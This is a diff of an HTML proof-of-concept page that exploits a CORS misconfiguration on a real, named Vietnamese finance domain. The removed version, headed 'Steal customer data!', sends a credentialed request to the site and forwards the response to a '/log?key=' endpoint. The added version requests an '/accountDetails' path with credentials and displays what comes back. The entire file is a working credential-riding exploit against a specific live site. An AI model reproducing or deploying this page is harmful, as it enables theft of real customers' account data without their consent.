@@ -1,22 +1,22 @@
-<!DOCTYPE html>
 <html>
-<body>
-<center>
-<h3>Steal customer data!</h3>
-<html>
-<body>
-<button type='button' onclick='cors()'>Exploit</button>
-<p id='demo'></p>
-<script>
-   var req = new XMLHttpRequest();
-   req.onload = reqListener;
-   req.open('get','https://fecredit.com.vn/index.php',true);
-   req.withCredentials = true;
-   req.send();
-
-   function reqListener() {
-       location='/log?key='+this.responseText;
-   };
-</script>
-</body>
-</html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://fecredit.com.vn/accountDetails", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
